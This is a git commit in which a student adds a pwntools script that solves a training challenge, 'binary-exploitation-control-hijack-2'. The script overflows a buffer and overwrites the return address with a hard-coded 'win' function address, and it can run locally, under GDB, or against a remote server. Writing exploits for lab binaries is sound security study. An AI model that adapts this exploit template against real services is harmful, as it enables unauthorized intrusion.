43d401fc030c1b87335dad7ff2fd9be943ae1ac8
grwna <13523035@std.stei.itb.ac.id>
2025-07-14 14:24:35 +0700

    add intro-to-cybersecurity

---
+++ intro-to-cyber/pwn/canary-hijack.py
@@ -0,0 +1,53 @@
+from pwn import *
+from grwnapy.pwn import find_offset
+
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './challenge/binary-exploitation-control-hijack-2'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'debug'
+
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Lib-C library, can use pwninit/patchelf to patch binary
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.27.so")
+
+# Pass in pattern_size, get back EIP/RIP offset
+offset = find_offset(exe, 200)
+win = 0x40140e
+
+# Start program
+io = start()
+# Build the payload
+payload = flat([
+    b"A"*offset,
+    win,
+])
+
+# Send the payload
+io.sendline(payload)
+io.recvuntil(b'Thank you!')
+
+# Got Shell?
+# io.interactive()
